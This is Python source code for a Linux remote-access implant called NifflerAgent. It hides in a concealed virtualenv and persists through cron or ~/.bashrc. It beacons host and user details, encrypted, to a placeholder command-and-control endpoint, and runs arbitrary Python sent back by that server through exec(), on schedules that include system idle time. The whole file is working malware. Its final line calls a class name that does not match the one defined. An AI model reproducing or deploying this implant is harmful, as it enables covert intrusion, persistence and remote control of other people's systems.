import time
import random
import sys
import os
import pwd
import threading
import venv
import subprocess
import requests

# Fix path navigation to look into core common directories
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.crypto_utils import CryptoEngine

SHARED_KEY = "{{BUILD_SHARED_KEY}}"
crypto = CryptoEngine(SHARED_KEY)
C2_ENDPOINT = "{{BUILD_C2_ENDPOINT}}"

class NifflerAgent:
    def __init__(self):
        self.agent_id = None
        self.hostname = self._read_file_line("/proc/sys/kernel/hostname") or "Unknown-Linux"
        self.username = pwd.getpwuid(os.getuid()).pw_name
        self.distribution = self._discover_distro()
        
        self.beacon_interval = int("{{BUILD_BEACON_INTERVAL}}")
        self.jitter = int("{{BUILD_JITTER}}")
        self.running = True
        
        self.venv_dir = os.path.expanduser("~/.local/share/.sys_cache")
        self.venv_site_packages = ""
        self.setup_stealth_venv()
        
        self.active_schedules = {} 
        self.establish_persistence()

    def setup_stealth_venv(self):
        try:
            if not os.path.exists(self.venv_dir):
                venv.create(self.venv_dir, with_pip=True)
            for root, dirs, files in os.walk(self.venv_dir):
                if "site-packages" in dirs:
                    self.venv_site_packages = os.path.join(root, "site-packages")
                    break
            if self.venv_site_packages and self.venv_site_packages not in sys.path:
                sys.path.insert(0, self.venv_site_packages)
        except Exception:
            pass

    def install_library_remotely(self, package_name: str) -> str:
        try:
            pip_path = os.path.join(self.venv_dir, "bin", "pip")
            if not os.path.exists(pip_path):
                pip_path = f"{self.venv_dir}/bin/pip3"
            process = subprocess.run(
                [pip_path, "install", "--no-warn-script-location", package_name],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            if process.returncode == 0:
                if self.venv_site_packages not in sys.path:
                    sys.path.insert(0, self.venv_site_packages)
                return f"Success: {package_name} linked into memory paths."
            return f"Error: {process.stderr}"
        except Exception as e:
            return f"Exception: {str(e)}"

    def _read_file_line(self, filepath: str) -> str:
        if os.path.exists(filepath):
            try:
                with open(filepath, "r") as f: return f.read().strip()
            except Exception: pass
        return ""

    def _discover_distro(self) -> str:
        content = self._read_file_line("/etc/os-release")
        if content:
            for line in content.splitlines():
                if line.startswith("PRETTY_NAME="):
                    return line.split("=")[1].replace('"', '')
        return "Generic Linux " + self._read_file_line("/proc/sys/kernel/osrelease")

    def establish_persistence(self):
        try:
            current_exec_path = os.path.abspath(sys.argv[0])
            cron_dir = "/var/spool/cron/crontabs" if os.path.exists("/var/spool/cron/crontabs") else "/var/spool/cron"
            user_cron_path = os.path.join(cron_dir, self.username)
            cron_line = f"*/30 * * * * python3 {current_exec_path} >/dev/null 2>&1\n"
            
            if not os.path.exists(cron_dir) or not os.access(cron_dir, os.W_OK):
                user_cron_path = os.path.expanduser("~/.bashrc")
                cron_line = f"\n(python3 {current_exec_path} &) >/dev/null 2>&1\n"

            if os.path.exists(user_cron_path):
                with open(user_cron_path, "r") as r:
                    if current_exec_path in r.read(): return
            
            with open(user_cron_path, "a") as w: w.write(cron_line)
        except Exception: pass

    def update_runtime_config(self, config_payload: dict):
        if config_payload:
            self.beacon_interval = config_payload.get("beacon_interval", self.beacon_interval)
            self.jitter = config_payload.get("jitter", self.jitter)

    def run_module_in_memory(self, task_id: str, source_code: str, sched_type: str, sched_val: str, duration: int):
        start_time = time.time()
        try:
            local_context = {}
            exec(source_code, globals(), local_context)
            if 'Module' not in local_context:
                self.send_server_msg("results", {"task_id": task_id, "status": "Failed", "output": "Invalid structure."})
                return

            instance = local_context['Module']()
            try:
                test_output = instance.run()
                if isinstance(test_output, str) and test_output.startswith("__VENV_INSTALL__:"):
                    target_pkg = test_output.split(":")[1]
                    install_res = self.install_library_remotely(target_pkg)
                    self.send_server_msg("results", {"task_id": task_id, "status": "Completed", "output": install_res})
                    return
            except Exception: pass

            while self.running:
                current_time = time.time()
                if duration > 0 and (current_time - start_time) > duration:
                    self.send_server_msg("results", {"task_id": task_id, "status": "LifespanExpired", "output": "Limit reached."})
                    break

                should_run = False
                if sched_type == "Immediate":
                    should_run = True
                elif sched_type == "Period":
                    interval = int(sched_val)
                    last_run = self.active_schedules.get(task_id, 0)
                    if current_time - last_run >= interval:
                        should_run = True
                        self.active_schedules[task_id] = current_time
                elif sched_type == "Event" and sched_val == "on_idle":
                    should_run = self._check_system_idle_state()

                if should_run:
                    output_data = instance.run()
                    self.send_server_msg("results", {"task_id": task_id, "status": "Active-Reporting", "output": str(output_data)})
                
                if sched_type == "Immediate": break
                time.sleep(5)
        except Exception as e:
            self.send_server_msg("results", {"task_id": task_id, "status": "Exception", "output": str(e)})

    def _check_system_idle_state(self) -> bool:
        try:
            with open("/proc/loadavg", "r") as f:
                load = float(f.read().split()[0])
            return load < 0.2
        except Exception: return True

    def send_server_msg(self, msg_type: str, data: dict) -> dict:
        data["type"] = msg_type
        data["agent_id"] = self.agent_id
        encrypted_str = crypto.encrypt_json(data)
        try:
            r = requests.post(C2_ENDPOINT, data=encrypted_str.encode(), timeout=15)
            if r.status_code == 200:
                return crypto.decrypt_json(r.json().get("payload"))
        except Exception: pass
        return {}

    def beacon(self):
        heartbeat = {"hostname": self.hostname, "username": self.username, "distribution": self.distribution}
        response = self.send_server_msg("checkin", heartbeat)
        if response:
            if not self.agent_id:
                self.agent_id = response.get("agent_id")
            self.update_runtime_config(response.get("config"))
            task = response.get("task")
            if task:
                t = threading.Thread(
                    target=self.run_module_in_memory, 
                    args=(task["task_id"], task["source"], task.get("schedule_type", "Immediate"), 
                          task.get("schedule_value", "0"), task.get("duration", 0))
                )
                t.daemon = True
                t.start()

    def start(self):
        while self.running:
            self.beacon()
            time.sleep(max(1, self.beacon_interval + random.randint(-self.jitter, self.jitter)))

if __name__ == "__main__":
    Niffler().start()
